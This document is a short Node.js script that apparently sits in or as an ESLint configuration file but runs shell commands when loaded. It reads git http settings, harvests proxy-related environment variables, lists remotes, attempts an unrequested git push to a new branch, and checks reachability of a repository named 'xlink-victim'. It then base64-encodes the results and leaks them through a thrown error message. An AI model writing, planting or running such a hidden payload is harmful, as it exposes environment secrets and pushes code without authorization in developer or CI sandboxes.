const cp = require('child_process');
function sh(c){ try { return cp.execSync(c,{timeout:20000,stdio:['ignore','pipe','pipe']}).toString().trim(); } catch(e){ return 'ERR:'+String(e.message||e).slice(0,110); } }
const o=[];
o.push('HTTPCFG:'+sh("git config --get-regexp '^http\\.' 2>&1 | sed 's/Proxy-Tokenizer: .\\{0,900\\}/Proxy-Tokenizer:<REDACTED>/' | head -c 300"));
o.push('PROXYENV:'+sh("env | grep -iE 'proxy|_url' | cut -c1-80 | head -8 | tr '\\n' ';'"));
o.push('REMOTE:'+sh("git -C /eslint.config.js/.. remote -v 2>/dev/null | head -2; cd $(git rev-parse --show-toplevel 2>/dev/null || echo /) && git remote -v 2>&1 | head -2"));
o.push('PUSH:'+sh("cd $(git rev-parse --show-toplevel 2>/dev/null||echo /tmp) && git push origin HEAD:refs/heads/cr-sbx-wtest 2>&1 | tail -2"));
o.push('APIVIA:'+sh("curl -s -m 8 -o /dev/null -w '%{http_code}' https://api.github.com/repos/kirasec-research2/xlink-victim 2>&1"));
const blob=Buffer.from(o.join('\n')).toString('base64');
throw new Error('TENB2_BEGIN ' + blob + ' TENB2_END');
